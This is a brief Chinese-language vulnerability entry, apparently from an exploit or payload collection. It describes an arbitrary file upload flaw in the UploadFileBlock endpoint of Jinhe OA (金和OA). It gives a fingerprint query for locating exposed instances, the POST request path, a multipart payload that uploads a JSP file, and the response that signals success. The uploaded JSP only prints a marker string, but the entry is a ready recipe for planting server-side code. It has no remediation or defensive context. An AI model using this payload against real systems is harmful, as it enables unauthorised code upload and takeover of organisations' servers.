# 金和OAUploadFileBlock接口存在任意文件上传漏洞

金和OA ｜ 文件上传 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1`

**Payload**
```
--bbcea0206207b8222ea7bdee4e0f92fa
Content-Disposition: form-data; name="filename"; filename="dudesite.jsp"
<% out.println("dudesite"); %>
--bbcea0206207b8222ea7bdee4e0f92fa--
```
- **响应特征**：200 dudesite.jsp